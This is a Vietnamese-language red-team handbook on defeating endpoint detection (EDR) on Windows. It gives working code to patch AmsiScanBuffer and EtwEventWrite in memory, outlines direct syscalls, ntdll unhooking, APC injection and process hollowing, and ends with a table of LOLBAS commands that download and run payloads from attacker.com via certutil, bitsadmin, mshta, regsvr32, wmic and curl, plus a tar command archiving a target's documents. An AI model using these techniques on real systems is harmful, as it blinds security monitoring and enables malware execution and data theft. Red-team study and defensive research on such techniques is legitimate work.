# CẨM NANG VƯỢT QUA EDR VÀ KỸ THUẬT LIVING OFF THE LAND (LOLBAS)
## EDR EVASION & LIVING OFF THE LAND BINARIES AND SCRIPTS
**Mã hiệu:** `SEC-REF-EDR-LOLBAS-2026`  
**Phiên bản:** `v3.0 - Advanced Evasion Standard`  
**Đơn vị biên soạn:** Đội ngũ Chuyên gia Tác chiến An toàn Thông tin (Red Team Operations)  
**Mục đích:** Nghiên cứu cơ chế vận hành của các giải pháp EDR (Endpoint Detection & Response) hiện đại và kỹ thuật né tránh phát hiện thông qua bộ nhớ và các tệp nhị phân hợp pháp.

---

## I. CƠ CHẾ HOẠT ĐỘNG CỦA CÁC GIẢI PHÁP EDR HIỆN ĐẠI

Các EDR hàng đầu (CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black) giám sát hệ thống thông qua 3 cơ chế chính:

```
1. User-Mode Hooking (Inline Hooking):
   EDR tiêm một DLL giám sát vào mọi tiến trình mới được tạo. DLL này sửa đổi các byte đầu tiên của các hàm API nhạy cảm trong `ntdll.dll` (như NtAllocateVirtualMemory, NtWriteVirtualMemory, NtCreateThreadEx) thành lệnh `JMP <EDR_Hook_Address>` để kiểm tra tham số trước khi chuyển về Kernel.

2. Kernel Callbacks:
   Driver của EDR ở Ring 0 đăng ký các hàm callback với nhân Windows (PsSetCreateProcessNotifyRoutine, PsSetCreateThreadNotifyRoutine, ObRegisterCallbacks) để nhận thông báo ngay khi tiến trình mới sinh ra hoặc handle được mở.

3. Event Tracing for Windows (ETW / ETW-Ti):
   Hệ thống ghi nhận vết sự kiện của Windows gửi dữ liệu telemetry (tiến trình, kết nối mạng, tải driver) về trung tâm xử lý của EDR.
```

---

## II. KỸ THUẬT VƯỢT QUA EDR (EDR EVASION TRADECRAFT)

### 1. Vượt qua AMSI (Antimalware Scan Interface Bypass)
AMSI là giao diện tích hợp trong Windows cho phép Antivirus quét nội dung của mã script (PowerShell, VBScript, JavaScript, .NET) trước khi thực thi trong bộ nhớ.
- **Kỹ thuật Memory Patching:** Sửa đổi byte đầu của hàm `AmsiScanBuffer` trong thư viện `amsi.dll` để hàm này luôn trả về kết quả `AMSI_RESULT_CLEAN` (Mã lỗi `0x80070057` - E_INVALIDARG):
```powershell
# Đoạn mã mẫu Patching AmsiScanBuffer bằng C# nạp động trong PowerShell:
$MethodDefinition = @"
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
$Win32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Win32' -Namespace 'Win32' -PassThru
$amsiDll = $Win32::LoadLibrary("amsi.dll")
$asbAddr = $Win32::GetProcAddress($amsiDll, "AmsiScanBuffer")
$oldProtect = 0
$Win32::VirtualProtect($asbAddr, [UIntPtr]::new(5), 0x40, [ref]$oldProtect)
# Ghi đè bằng lệnh RET (0xC3) hoặc mã lỗi:
[System.Runtime.InteropServices.Marshal]::Copy([byte[]](0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3), 0, $asbAddr, 6)
```

---

### 2. Vô hiệu hóa ETW (Event Tracing for Windows Patching)
Tương tự AMSI, vô hiệu hóa việc ghi log telemetry bằng cách patch hàm `EtwEventWrite` trong `ntdll.dll` để hàm này trả về ngay lập tức mà không gửi log sự kiện:
```c
// C Code mẫu Patching EtwEventWrite
void PatchETW() {
    DWORD oldProtect;
    FARPROC pFunc = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
    VirtualProtect(pFunc, 4096, PAGE_EXECUTE_READWRITE, &oldProtect);
    #if defined(_WIN64)
        memcpy(pFunc, "\x48\x33\xc0\xc3", 4); // xor rax, rax; ret
    #else
        memcpy(pFunc, "\x33\xc0\xc2\x14\x00", 5); // xor eax, eax; ret 14h
    #endif
    VirtualProtect(pFunc, 4096, oldProtect, &oldProtect);
}
```

---

### 3. Gọi Trực tiếp Lệnh Hệ thống (Direct System Calls)
Vì EDR chỉ hook các hàm trong thư viện `ntdll.dll` ở User-Mode, Red Team có thể tự định nghĩa các hàm assembly để gọi trực tiếp lệnh ngắt `syscall` với System Service Number (SSN) tương ứng mà không đi qua các hàm bị EDR gắn hook:
- **SysWhispers2 / SysWhispers3:** Tự động tạo mã stub assembly cho các hàm NT API.
- **Hell's Gate / Halo's Gate:** Tự động đọc bộ nhớ `ntdll.dll` tại thời điểm chạy để tìm mã SSN của syscall. Nếu hàm bị hook, nó đọc các hàm lân cận để tính toán ra SSN chính xác.

---

### 4. Gỡ Hook Bộ nhớ (API Unhooking / Perun's Fart)
Nạp một bản sao nguyên bản sạch sẽ của file `ntdll.dll` từ đĩa cứng hoặc từ tệp `\KnownDlls\ntdll.dll`, sau đó sao chép phân vùng `.text` sạch đè lên phân vùng `.text` đang bị EDR hook trong bộ nhớ của tiến trình.

---

### 5. Tiêm Tiến trình Tinh vi (Sophisticated Process Injection)
1. **Early Bird APC Queue Injection:**
   - Tạo tiến trình nạn nhân (ví dụ: `svchost.exe`) ở trạng thái treo (`CREATE_SUSPENDED`).
   - Cấp phát bộ nhớ và ghi Shellcode vào tiến trình mới.
   - Thêm một Asynchronous Procedure Call (APC) vào luồng chính qua `QueueUserAPC`.
   - Đánh thức luồng (`ResumeThread`). Mã độc được thực thi TRƯỚC KHI các DLL của EDR kịp nạp và gắn hook!
2. **Process Hollowing:**
   - Tạo tiến trình hợp pháp ở trạng thái treo.
   - Hủy ánh xạ bộ nhớ gốc của tiến trình (`NtUnmapViewOfSection`).
   - Ghi mã độc vào địa chỉ cơ sở và trỏ lại thanh ghi con trỏ lệnh vào EntryPoint của mã độc.

---

## III. BẢNG TRA CỨU NHANH KỸ THUẬT LIVING OFF THE LAND (LOLBAS)

LOLBAS (Living Off The Land Binaries and Scripts) là kỹ thuật sử dụng chính các file thực thi có sẵn của Windows để tải file, thực thi lệnh hoặc vượt qua cơ chế phòng thủ (AppLocker/WDAC):

| Công cụ Windows | Chức năng Lạm dụng trong Red Team | Câu lệnh Mẫu Thực chiến |
|---|---|---|
| **`certutil.exe`** | Tải file độc hại qua HTTP và giải mã base64 | `certutil.exe -urlcache -split -f http://attacker.com/payload.bin payload.exe` |
| **`bitsadmin.exe`** | Tải file ngầm dưới quyền dịch vụ hệ thống | `bitsadmin /transfer myjob /download /priority normal http://attacker.com/payload.exe C:\payload.exe` |
| **`mshta.exe`** | Thực thi mã VBScript/JavaScript từ xa | `mshta.exe http://attacker.com/payload.hta` |
| **`rundll32.exe`** | Thực thi hàm DLL độc hại hoặc DLL từ xa | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();...` |
| **`regsvr32.exe`** | Kỹ thuật Squiblydoo: tải và chạy scriptlet XML | `regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll` |
| **`wmic.exe`** | Thực thi file XSL độc hại vượt AppLocker | `wmic process get brief /format:http://attacker.com/payload.xsl` |
| **`curl.exe`** | Có sẵn từ Windows 10 build 1803 để tải file | `curl -o payload.exe http://attacker.com/payload.exe` |
| **`tar.exe`** | Có sẵn từ Windows 10 để nén dữ liệu trích xuất | `tar.exe -cf data.zip C:\Users\target\Documents` |

---
*Tài liệu này cung cấp kiến thức thực chiến đỉnh cao, giúp Red Team hiểu rõ cách thức hoạt động của EDR và rèn luyện kỹ năng vượt qua các hệ thống phòng thủ tiên tiến.*
